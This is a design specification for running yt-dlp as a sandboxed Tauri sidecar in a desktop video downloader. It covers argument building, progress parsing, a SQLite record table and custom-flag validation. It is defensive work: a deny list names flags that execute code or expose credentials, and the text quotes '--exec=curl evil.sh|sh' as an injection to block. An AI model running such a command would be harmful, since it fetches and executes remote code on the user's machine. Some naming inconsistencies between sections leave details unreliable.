# 03 - yt-dlp Sidecar

> **Domain:** `backend`
> **Status:** Design specification (implementation target for `src-tauri/src/ytdlp`)
> **Related:** [02-tauri-commands.md](02-tauri-commands.md), [06-network-proxy.md](06-network-proxy.md)

---

## 1. Overview

`yt-dlp` is shipped as a **Tauri sidecar**: an external binary bundled with the app and spawned as a child process. It is never invoked through a shell, so no argument string is ever parsed by `sh`/`cmd` — every argument is passed as a discrete `argv` element.

```
┌──────────────┐  invoke        ┌────────────────┐  spawn(argv)   ┌──────────┐
│  Vue (UI)    │───────────────►│  Rust command  │───────────────►│  yt-dlp  │
│              │◄───────────────│  DownloadMgr   │◄───────────────│  child   │
└──────────────┘  tauri events  └───────┬────────┘  stdout lines  └──────────┘
                                        │
                                        ▼
                                 downloads table
```

Responsibilities split:

| Layer | Owns |
|---|---|
| Vue | Queue UI, per-item progress bars, retry/cancel affordances |
| Rust `YtDlpState` | Active process handles (`Arc<Mutex<HashMap<u64, Child>>>`), download counter, event emission |
| yt-dlp child | Extraction, network I/O, muxing (via ffmpeg) |

`YtDlpState` uses `tokio::sync::Mutex` (not `std::sync::Mutex`) because the guards are held across `.await` points.

`YtDlpState` uses `tokio::sync::Mutex` (not `std::sync::Mutex`) because the guards are held across `.await` points.

---

## 2. Sidecar Binary Configuration

### 2.1 Layout

Tauri resolves sidecars by appending the **target triple** to the configured base name:

```
src-tauri/binaries/
├── yt-dlp-x86_64-unknown-linux-gnu
├── yt-dlp-aarch64-unknown-linux-gnu
├── yt-dlp-x86_64-apple-darwin
├── yt-dlp-aarch64-apple-darwin
├── yt-dlp-x86_64-pc-windows-msvc.exe
├── ffmpeg-x86_64-unknown-linux-gnu
├── ffmpeg-aarch64-apple-darwin
└── ffmpeg-x86_64-pc-windows-msvc.exe
```

### 2.2 `tauri.conf.json`

```json
{
  "bundle": {
    "externalBin": [
      "binaries/yt-dlp",
      "binaries/ffmpeg"
    ],
    "resources": []
  },
  "plugins": {
    "shell": {
      "open": false
    }
  }
}
```

### 2.3 Capability

Sidecar execution must be explicitly permitted. The scope pins the sidecar name so the shell plugin cannot be coerced into running arbitrary programs.

```json
// src-tauri/capabilities/default.json (excerpt)
{
  "permissions": [
    {
      "identifier": "shell:allow-execute",
      "allow": [
        { "name": "binaries/yt-dlp", "sidecar": true, "args": true },
        { "name": "binaries/ffmpeg", "sidecar": true, "args": true }
      ]
    }
  ]
}
```

> `"args": true` allows dynamic arguments. This is why the **allow-list validation in §7 is mandatory** — the capability layer is not doing the filtering for us.

### 2.4 Per-platform notes

| Platform | Notes |
|---|---|
| Linux | Binary must be `chmod +x` before bundling. Prefer the `yt-dlp_linux` static build; the pure-Python zipapp requires a system Python |
| macOS | Universal builds are not published upstream — ship both arch binaries. Both must be **codesigned and included in the notarisation** or Gatekeeper kills the child on first launch |
| Windows | Use `yt-dlp.exe`; spawn with `CREATE_NO_WINDOW` (`.creation_flags(0x08000000)`) to suppress the console flash |

### 2.5 Resolving and probing

```rust
// src-tauri/src/ytdlp/mod.rs
use tauri_plugin_shell::{ShellExt, process::CommandEvent};

pub async fn probe_version(app: &tauri::AppHandle) -> Result<String, AppError> {
    let sidecar = app.shell()
        .sidecar("yt-dlp")
        .map_err(|e| AppError::Sidecar(e.to_string()))?;

    let output = sidecar
        .args(["--version"])
        .output()
        .await
        .map_err(|e| AppError::Sidecar(e.to_string()))?;

    if !output.status.success() {
        return Err(AppError::Sidecar(String::from_utf8_lossy(&output.stderr).into()));
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}
```

The version is probed once at startup, cached in `AppState`, and surfaced in Settings → About. A missing or non-executable sidecar degrades gracefully: download UI is disabled with an actionable message rather than the app failing to boot.

---

## 3. Base Argument Construction

Every invocation starts from a hardened base set.

```rust
fn base_args(app: &AppHandle, cfg: &DownloadConfig) -> Vec<String> {
    let mut a: Vec<String> = vec![
        // Machine-readable output
        "--newline".into(),                    // one progress line per update
        "--progress".into(),
        "--progress-template".into(),
        "download:%(progress._percent_str)s|%(progress._downloaded_bytes_str)s|\
         %(progress._total_bytes_str)s|%(progress._speed_str)s|%(progress._eta_str)s".into(),
        "--no-colors".into(),
        // Safety / predictability
        "--no-playlist".into(),
        "--no-mtime".into(),
        "--no-continue".into(),
        "--no-part".into(),
        "--restrict-filenames".into(),
        "--no-overwrites".into(),
        "--ignore-config".into(),              // ignore user's global yt-dlp config
        "--no-exec".into(),                    // never run post-processing shell hooks
        // Resilience
        "--retries".into(), "3".into(),
        "--fragment-retries".into(), "3".into(),
        "--socket-timeout".into(), "30".into(),
    ];

    // Bundled ffmpeg, so merging never depends on the host PATH.
    if let Some(ff) = ffmpeg_path(app) {
        a.push("--ffmpeg-location".into());
        a.push(ff.to_string_lossy().into_owned());
    }

    if let Some(proxy) = &cfg.proxy_url {
        a.push("--proxy".into());
        a.push(proxy.clone());
    }

    if cfg.rate_limit_kib > 0 {
        a.push("--limit-rate".into());
        a.push(format!("{}K", cfg.rate_limit_kib));
    }

    if let Some(cookies) = &cfg.cookies_file {
        a.push("--cookies".into());
        a.push(cookies.clone());
    }

    a
}
```

`--ignore-config` and `--no-exec` are load-bearing security choices: without them a hostile `~/.config/yt-dlp/config` could inject `--exec` and achieve arbitrary code execution through our sidecar.

---

## 4. Commands

Registered as `yt_dlp_*` in `src-tauri/src/yt_dlp/commands.rs` and exposed to the frontend as `ytDlp.*` via `invoke()`.

| Command | Signature | Purpose |
|---|---|---|
| `yt_dlp_get_info` | `(url: string) -> serde_json::Value` | `--dump-json --no-download` metadata fetch |
| `yt_dlp_get_playback_info` | `(url: string) -> serde_json::Value` | `--dump-json --no-download --no-warnings` for stream formats |
| `yt_dlp_download` | `(args: YtDlpDownloadArgs) -> u64` | Spawn download, return numeric `downloadId` |
| `yt_dlp_cancel` | `(id: u64) -> void` | Kill child, emit `yt-dlp-cancelled` |
| `yt_dlp_list` | `() -> Vec<DownloadStatus>` | Merge DB records with in-memory active downloads |

> **Phase 1 status:** No `yt_dlp_download_binary` command yet — binary management is out of scope for the initial implementation. No semaphore-based concurrency limiting; downloads are spawned directly.

### 4.1 `yt_dlp_download` (continued)

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct YtDlpDownloadArgs {
    pub video_id: String,
    #[serde(default)]
    pub video_ids: Option<Vec<String>>,
    #[serde(default)]
    pub playlist_id: Option<String>,
    pub mode: DownloadMode,                // 'video' | 'audio' | 'custom'
    #[serde(default)]
    pub quality: Option<String>,
    #[serde(default)]
    pub video_format: Option<String>,
    #[serde(default)]
    pub audio_format: Option<String>,
    #[serde(default)]
    pub video_codec: Option<String>,
    #[serde(default)]
    pub filename_template: Option<String>,
    #[serde(default)]
    pub start_time: Option<String>,
    #[serde(default)]
    pub end_time: Option<String>,
    #[serde(default)]
    pub split_chapters: bool,
    #[serde(default)]
    pub remove_sponsorblock: bool,
    #[serde(default)]
    pub sponsor_block_categories: Vec<String>,
    #[serde(default)]
    pub include_subtitles: bool,
    #[serde(default)]
    pub embed_subtitles: bool,
    #[serde(default)]
    pub subtitle_languages: Option<String>,
    #[serde(default)]
    pub embed_thumbnail: bool,
    #[serde(default)]
    pub embed_metadata: bool,
    #[serde(default)]
    pub custom_args: Option<String>,
}
```

Command flow:

1. Build argv from args (output template, format selection, chapters, SponsorBlock, subtitles, thumbnail, metadata, custom args).
2. Increment `state.download_counter` to get a numeric `download_id`.
3. `INSERT INTO download_records` with `status = 'pending'`.
4. Spawn child via `tokio::process::Command`.
5. Insert child into `state.active_downloads`.
6. Spawn `monitor_download` task for stdout parsing.
7. Return `download_id` as `u64`.

### 4.2 `yt_dlp_cancel` (continued)

```rust
#[tauri::command]
pub async fn yt_dlp_cancel(
    app_handle: AppHandle,
    id: u64,
    state: State<'_, YtDlpState>,
) -> Result<(), String> {
    let child = {
        let mut active = state.active_downloads.lock().await;
        active.remove(&id)
    };
    if let Some(mut child) = child {
        child.kill().await.map_err(|e| format!("Failed to kill process: {}", e))?;
        let _ = app_handle.emit("yt-dlp-cancelled", id);
    }
    Ok(())
}
```

### 4.3 `yt_dlp_list` (continued)

```rust
pub async fn yt_dlp_list(
    pool: State<'_, DbPool>,
    state: State<'_, YtDlpState>,
) -> Result<Vec<DownloadStatus>, String>
```

Returns `Vec<DownloadStatus>` — **not** `Vec<u64>` as the original design implied. Merges two sources:

1. Query `SELECT ... FROM download_records ORDER BY created_at DESC` and map rows to `DownloadStatus`.
2. Add any entries from `state.active_downloads` not yet present in the DB result (covers the brief window between spawn and first DB read).

`DownloadStatus` struct:

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DownloadStatus {
    pub id: u64,
    pub video_id: String,
    pub title: String,
    pub status: String,
    pub percent: f64,
    pub speed: Option<String>,
    pub eta: Option<String>,
    pub destination: Option<String>,
    pub error_message: Option<String>,
}
```

### 4.4 `yt_dlp_get_info` (continued)

```rust
#[tauri::command]
pub async fn yt_dlp_get_info(
    app_handle: AppHandle,
    url: String,
) -> Result<serde_json::Value, String> {
    let binary_path = get_binary_path(&app_handle)?;
    let output = Command::new(&binary_path)
        .args(["--dump-json", "--no-download", &url])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .await
        .map_err(|e| format!("Failed to run yt-dlp: {}", e))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(format!("yt-dlp error: {}", stderr));
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout)
        .map_err(|e| format!("Failed to parse yt-dlp output: {}", e))?;
    Ok(json)
}
```

Returns the full `--dump-json` output as `serde_json::Value` — not a trimmed `VideoInfo` struct. The frontend selects the fields it needs.

### 4.5 `yt_dlp_get_playback_info`

Identical to `yt_dlp_get_info` but adds `--no-warnings` to stderr. Returns the same `serde_json::Value` shape.

### 4.6 `yt_dlp_download_binary`

**Not yet implemented.** Binary management (self-update, checksum verification) is out of scope for Phase 1.

Self-updates the sidecar without shipping a new app build.

```rust
#[tauri::command]
pub async fn download_binary(
    app: AppHandle,
    state: State<'_, AppState>,
    channel: Option<String>,   // 'stable' | 'nightly'
) -> Result<String, AppError> {
    let channel = channel.unwrap_or_else(|| "stable".into());
    let asset = platform_asset_name()?;   // e.g. 'yt-dlp_linux', 'yt-dlp.exe'
    let url = match channel.as_str() {
        "stable"  => format!("https://github.com/yt-dlp/yt-dlp/releases/latest/download/{asset}"),
        "nightly" => format!("https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/latest/download/{asset}"),
        _ => return Err(AppError::Invalid("unknown channel".into())),
    };

    // Never overwrite the bundled binary — write to a writable override dir.
    let dir = app.path().app_data_dir()?.join("bin");
    tokio::fs::create_dir_all(&dir).await?;
    let tmp = dir.join(format!("{asset}.part"));
    let dest = dir.join(&asset);

    let bytes = state.http.get(&url).send().await
        .map_err(|e| AppError::Network(e.to_string()))?
        .error_for_status().map_err(|e| AppError::Network(e.to_string()))?
        .bytes().await.map_err(|e| AppError::Network(e.to_string()))?;

    verify_sha256(&bytes, &fetch_sums(&state.http, &channel).await?, &asset)?;

    tokio::fs::write(&tmp, &bytes).await?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        tokio::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o755)).await?;
    }
    tokio::fs::rename(&tmp, &dest).await?;   // atomic swap

    let version = probe_version_at(&dest).await?;
    db::settings::upsert(&state.pool, "ytdlpOverridePath",
        &serde_json::json!(dest.to_string_lossy())).await?;
    Ok(version)
}
```

Resolution order at spawn time is **override path → bundled sidecar**. Checksum verification against the release `SHA2-256SUMS` file is mandatory; a mismatch aborts and leaves the previous binary untouched.

---

## 5. Progress Events

### 5.1 Event payloads

```rust
#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
pub struct DownloadProgress {
    pub id: String,
    pub video_id: Option<String>,
    pub percent: f32,          // 0.0..=100.0
    pub downloaded_bytes: Option<u64>,
    pub total_bytes: Option<u64>,
    pub speed_bps: Option<u64>,
    pub eta_secs: Option<u64>,
    pub phase: Phase,          // resolving | downloading | merging | postprocessing | finished
    pub fragment: Option<(u32, u32)>,
}
```

Events are emitted **globally** via `app.emit()`. The frontend subscribes via `listen()` in `useDownloads.ts`. Each event name is prefixed `yt-dlp-`:

| Event | Payload |
|---|---|
| `yt-dlp-progress` | `{ id, percent, speed, eta }` |
| `yt-dlp-destination` | `{ id, destination }` |
| `yt-dlp-complete` | `{ id }` |
| `yt-dlp-error` | `{ id, error }` |
| `yt-dlp-cancelled` | `id` (plain number) |

### 5.2 Stdout reader

```rust
async fn run_child(
    app: AppHandle,
    pool: SqlitePool,
    id: String,
    args: Vec<String>,
    token: CancellationToken,
) -> Result<(), AppError> {
    let (mut rx, mut child) = app.shell()
        .sidecar("yt-dlp")
        .map_err(|e| AppError::Sidecar(e.to_string()))?
        .args(args)
        .spawn()
        .map_err(|e| AppError::Sidecar(e.to_string()))?;

    let _ = app.emit("download:started", serde_json::json!({ "id": id, "pid": child.pid() }));

    let mut last_emit = std::time::Instant::now();
    let mut last_pct = -1.0f32;
    let mut stderr_tail: Vec<String> = Vec::with_capacity(20);
    let mut final_path: Option<String> = None;

    loop {
        tokio::select! {
            _ = token.cancelled() => {
                let _ = child.kill();
                return Err(AppError::Cancelled);
            }
            maybe = rx.recv() => {
                let Some(event) = maybe else { break };
                match event {
                    CommandEvent::Stdout(line) => {
                        let line = String::from_utf8_lossy(&line).trim().to_string();

                        if let Some(p) = parse_progress(&line) {
                            let due = last_emit.elapsed() >= Duration::from_millis(250);
                            if due || (p.percent - last_pct).abs() >= 1.0 || p.percent >= 100.0 {
                                last_emit = std::time::Instant::now();
                                last_pct  = p.percent;
                                let _ = app.emit("download:progress", &p);
                            }
                        } else if let Some(phase) = parse_phase(&line) {
                            let _ = app.emit("download:phase",
                                serde_json::json!({ "id": id, "phase": phase }));
                        } else if let Some(path) = parse_destination(&line) {
                            final_path = Some(path);
                        }
                    }
                    CommandEvent::Stderr(line) => {
                        let s = String::from_utf8_lossy(&line).trim().to_string();
                        if stderr_tail.len() == 20 { stderr_tail.remove(0); }
                        stderr_tail.push(s);
                    }
                    CommandEvent::Terminated(payload) => {
                        if payload.code == Some(0) {
                            db::downloads::complete(&pool, &id, final_path.as_deref()).await?;
                            let _ = app.emit("download:completed",
                                db::downloads::get(&pool, &id).await?);
                        } else {
                            let msg = classify_stderr(&stderr_tail.join("\n"));
                            db::downloads::fail(&pool, &id, &msg).await?;
                            let _ = app.emit("download:failed",
                                serde_json::json!({ "id": id, "kind": "sidecar", "message": msg }));
                        }
                        break;
                    }
                    _ => {}
                }
            }
        }
    }

    Ok(())
}
```

### 5.3 Progress parsing

Because `--progress-template` pins the format, parsing is a `split('|')` rather than a fragile regex over yt-dlp's human-readable output:

```rust
fn parse_progress(line: &str) -> Option<DownloadProgress> {
    let rest = line.strip_prefix("download:")?;
    let mut parts = rest.split('|');
    let percent = parts.next()?.trim().trim_end_matches('%').parse::<f32>().ok()?;
    let downloaded = parse_size(parts.next()?);
    let total      = parse_size(parts.next()?);
    let speed      = parse_speed(parts.next()?);
    let eta        = parse_eta(parts.next()?);
    Some(DownloadProgress { percent, downloaded_bytes: downloaded, total_bytes: total,
                            speed_bps: speed, eta_secs: eta, phase: Phase::Downloading, .. })
}
```

Phase detection watches for `[Merger]`, `[ExtractAudio]`, `[EmbedSubtitle]`, `[Metadata]`, and `[SponsorBlock]` prefixes.

### 5.4 Error classification

`classify_stderr` maps raw yt-dlp text to a stable, translatable reason code:

| stderr fragment | Reason code |
|---|---|
| `Sign in to confirm your age` | `age_restricted` |
| `Video unavailable` | `unavailable` |
| `Private video` | `private` |
| `This live event will begin in` | `not_started` |
| `HTTP Error 429` | `rate_limited` |
| `Unable to download webpage` / `Failed to resolve` | `network` |
| `Requested format is not available` | `format_unavailable` |
| `ffmpeg not found` | `ffmpeg_missing` |
| `Sign in to confirm you're not a bot` | `bot_check` (prompt PoToken — see [04-potoken-generation.md](04-potoken-generation.md)) |

---

## 6. Download Record Persistence

### 6.1 Table

The implementation uses `download_records` (not `downloads`). Defined in `src-tauri/migrations/001_initial_schema.sql`:

```sql
CREATE TABLE IF NOT EXISTS download_records (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    video_id     TEXT    NOT NULL,
    title        TEXT    NOT NULL,
    status       TEXT    NOT NULL DEFAULT 'pending',
    percent      REAL    NOT NULL DEFAULT 0.0,
    destination  TEXT    NOT NULL DEFAULT '',
    created_at   TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_download_records_status      ON download_records(status);
CREATE INDEX IF NOT EXISTS idx_download_records_created_at  ON download_records(created_at DESC);
```

### 6.2 Write policy

| Trigger | Written |
|---|---|
| `yt_dlp_download` command | Full row, `status = pending` |
| Progress line parsed | `percent` and `status = 'downloading'` |
| Destination line parsed | `destination`, `title` (derived from filename) |
| Exit code 0 | `status = 'completed'`, `percent = 100.0` |
| Non-zero exit | `status = 'failed'` (error event emitted separately) |
| Cancel | `yt-dlp-cancelled` event emitted (DB update TBD) |

> **Note:** Progress updates are applied per-line rather than on a 5 s / 10% batch. For typical download rates this is acceptable; batching can be added if write contention becomes measurable.

### 6.3 Crash recovery

Not yet implemented. A follow-up should reconcile rows left in `pending`/`downloading` on startup and sweep orphaned `.part` files.

---

## 7. Custom Args Validation

Power users can append raw yt-dlp flags. Everything not explicitly known-safe is rejected — **deny-list plus allow-list**, checked in that order.

```rust
/// Flags that can execute code, exfiltrate data, read/write outside the
/// sandbox, or break our own output/progress contract.
pub const DENIED_CUSTOM_ARGS: &[&str] = &[
    // Arbitrary code execution
    "--exec", "--exec-before-download", "--no-exec",
    "--postprocessor-args", "--ppa",
    "--external-downloader", "--downloader",
    "--external-downloader-args", "--downloader-args",
    // Config / plugin injection
    "--config-location", "--config-locations",
    "--ignore-config", "--no-config-locations",
    "--plugin-dirs", "--load-info-json", "--load-info",
    // Filesystem escape
    "--output", "-o", "--paths", "-P",
    "--output-na-placeholder", "--home",
    "--batch-file", "-a",
    "--cache-dir", "--cookies", "--cookies-from-browser",
    // Credentials / privacy
    "--username", "-u", "--password", "-p",
    "--netrc", "--netrc-location", "--netrc-cmd",
    "--video-password", "--ap-username", "--ap-password",
    // Breaks our IPC contract
    "--dump-json", "-j", "--dump-single-json", "-J",
    "--print", "--print-to-file", "--quiet", "-q",
    "--no-progress", "--progress-template", "--newline",
    "--no-newline", "--verbose", "-v",
    // Bulk / destructive
    "--playlist-items", "-I", "--yes-playlist",
    "--rm-cache-dir", "--flat-playlist",
    // Redundant with first-class settings
    "--proxy", "--limit-rate", "-r", "--ffmpeg-location",
];

/// Flags a user may legitimately add.
pub const ALLOWED_CUSTOM_ARGS: &[&str] = &[
    "--concurrent-fragments", "-N",
    "--throttled-rate",
    "--retry-sleep",
    "--file-access-retries",
    "--buffer-size", "--http-chunk-size",
    "--force-ipv4", "-4", "--force-ipv6", "-6",
    "--source-address",
    "--user-agent", "--referer", "--add-header",
    "--geo-bypass", "--geo-bypass-country", "--no-geo-bypass",
    "--sleep-requests", "--sleep-interval", "--max-sleep-interval",
    "--extractor-args", "--extractor-retries",
    "--sub-langs", "--write-subs", "--write-auto-subs", "--convert-subs",
    "--embed-chapters", "--no-embed-chapters",
    "--audio-quality", "--remux-video", "--recode-video",
    "--merge-output-format",
    "--live-from-start", "--wait-for-video",
    "--mark-watched", "--no-mark-watched",
];

pub fn validate_custom_args(args: &[String]) -> Result<Vec<String>, AppError> {
    if args.len() > 32 {
        return Err(AppError::Invalid("too many custom arguments".into()));
    }

    let mut out = Vec::with_capacity(args.len());
    let mut i = 0;

    while i < args.len() {
        let raw = args[i].trim();

        if raw.is_empty() {
            i += 1;
            continue;
        }

        // Reject shell metacharacters even though we never use a shell —
        // defence in depth against a future refactor introducing one.
        if raw.contains(['\n', '\r', '\0', ';', '|', '&', '`', '$']) {
            return Err(AppError::Invalid(format!("illegal characters in argument: {raw}")));
        }

        if !raw.starts_with('-') {
            return Err(AppError::Invalid(format!("bare value without a flag: {raw}")));
        }

        // Normalise '--flag=value' to compare the flag alone.
        let (flag, inline_value) = match raw.split_once('=') {
            Some((f, v)) => (f, Some(v)),
            None => (raw, None),
        };
        let flag_l = flag.to_ascii_lowercase();

        if DENIED_CUSTOM_ARGS.contains(&flag_l.as_str()) {
            return Err(AppError::Invalid(format!("argument is not permitted: {flag}")));
        }
        if !ALLOWED_CUSTOM_ARGS.contains(&flag_l.as_str()) {
            return Err(AppError::Invalid(format!("argument is not recognised: {flag}")));
        }

        out.push(raw.to_string());
        i += 1;

        // Consume a following value token when the flag takes one and
        // it was not supplied inline. The value must not look like a flag.
        if inline_value.is_none() && flag_takes_value(&flag_l) {
            let Some(value) = args.get(i) else {
                return Err(AppError::Invalid(format!("{flag} expects a value")));
            };
            if value.starts_with("--") {
                return Err(AppError::Invalid(format!("{flag} expects a value, got {value}")));
            }
            if value.contains(['\n', '\r', '\0']) {
                return Err(AppError::Invalid("illegal characters in value".into()));
            }
            out.push(value.clone());
            i += 1;
        }
    }

    Ok(out)
}
```

Custom args are appended **after** the base args, so a permitted duplicate overrides the default (yt-dlp last-wins) — but nothing on the deny-list can ever reach the child.

### 7.1 URL validation

```rust
fn validate_url(url: &str) -> Result<(), AppError> {
    let parsed = url::Url::parse(url).map_err(|_| AppError::Invalid("malformed URL".into()))?;
    if !matches!(parsed.scheme(), "http" | "https") {
        return Err(AppError::Invalid("only http(s) URLs are supported".into()));
    }
    if url.starts_with('-') {
        return Err(AppError::Invalid("URL cannot start with '-'".into()));
    }
    Ok(())
}
```

The leading-dash check prevents a "URL" like `--exec=curl evil.sh|sh` from being interpreted as a flag. As a belt-and-braces measure the URL is always passed after a `--` terminator.

---

## 8. Format & Codec Options

### 8.1 Selector construction

```rust
pub fn build_format_selector(req: &DownloadRequest) -> String {
    if req.quality == "audio" {
        let acodec = match req.audio_codec.as_deref() {
            Some("aac")  => "[acodec^=mp4a]",
            Some("opus") => "[acodec=opus]",
            _ => "",
        };
        return format!("bestaudio{acodec}/bestaudio/best");
    }

    let height = match req.quality.as_str() {
        "2160p" => Some(2160), "1440p" => Some(1440), "1080p" => Some(1080),
        "720p"  => Some(720),  "480p"  => Some(480),  "360p"  => Some(360),
        _ => None,
    };
    let hf = height.map(|h| format!("[height<={h}]")).unwrap_or_default();

    let vf = match req.video_codec.as_deref() {
        Some("h264") => "[vcodec^=avc1]",
        Some("vp9")  => "[vcodec^=vp9]",
        Some("av1")  => "[vcodec^=av01]",
        _ => "",
    };

    // Prefer split streams (higher max quality), fall back to progressive.
    format!("bestvideo{hf}{vf}+bestaudio/best{hf}{vf}/bestvideo{hf}+bestaudio/best")
}
```

### 8.2 Container matrix

| Container | Video codecs | Audio codecs | Merge flag |
|---|---|---|---|
| `mp4` | h264, av1 | aac, opus (in-container) | `--merge-output-format mp4` |
| `webm` | vp9, av1 | opus, vorbis | `--merge-output-format webm` |
| `mkv` | any | any | `--merge-output-format mkv` (safest fallback) |
| `m4a` | — | aac | `-x --audio-format m4a` |
| `mp3` | — | transcoded | `-x --audio-format mp3 --audio-quality 0` |
| `opus` | — | opus | `-x --audio-format opus` |

Selecting `mp4` with `vp9` is invalid; the builder silently promotes the container to `mkv` and reports the substitution in the download record's `container` field so the UI can explain it.

### 8.3 Post-processing flags

```rust
fn postprocess_args(req: &DownloadRequest) -> Vec<String> {
    let mut a = Vec::new();

    if req.embed_metadata { a.push("--embed-metadata".into()); }
    if req.embed_thumbnail {
        a.push("--embed-thumbnail".into());
        a.push("--convert-thumbnails".into());
        a.push("jpg".into());
    }
    if req.embed_subs {
        a.push("--write-subs".into());
        a.push("--write-auto-subs".into());
        a.push("--embed-subs".into());
        a.push("--sub-langs".into());
        a.push("en.*,-live_chat".into());
    }
    if let Some(cats) = &req.sponsorblock {
        if !cats.is_empty() {
            // Only known category tokens reach the child.
            const OK: &[&str] = &["sponsor","selfpromo","interaction","intro",
                                  "outro","preview","music_offtopic","filler"];
            let clean: Vec<&str> = cats.iter()
                .map(String::as_str)
                .filter(|c| OK.contains(c))
                .collect();
            if !clean.is_empty() {
                a.push("--sponsorblock-remove".into());
                a.push(clean.join(","));
            }
        }
    }
    a
}
```

### 8.4 Full argv assembly

```rust
pub fn build_argv(app: &AppHandle, req: &DownloadRequest, out_dir: &Path,
                  extra: &[String], cfg: &DownloadConfig) -> Vec<String> {
    let mut argv = base_args(app, cfg);

    argv.push("-f".into());
    argv.push(build_format_selector(req));

    if let Some(fmt) = merge_format(req) {
        argv.push("--merge-output-format".into());
        argv.push(fmt);
    }

    argv.push("-o".into());
    argv.push(out_dir.join(
        req.filename_template.as_deref().unwrap_or("%(title)s [%(id)s].%(ext)s")
    ).to_string_lossy().into_owned());

    argv.extend(postprocess_args(req));
    argv.extend(extra.iter().cloned());   // already validated

    argv.push("--".into());               // end of options
    argv.push(req.url.clone());
    argv
}
```

The effective argv is stored in `downloads.args_json`, which makes any user-reported failure exactly reproducible from the command line.
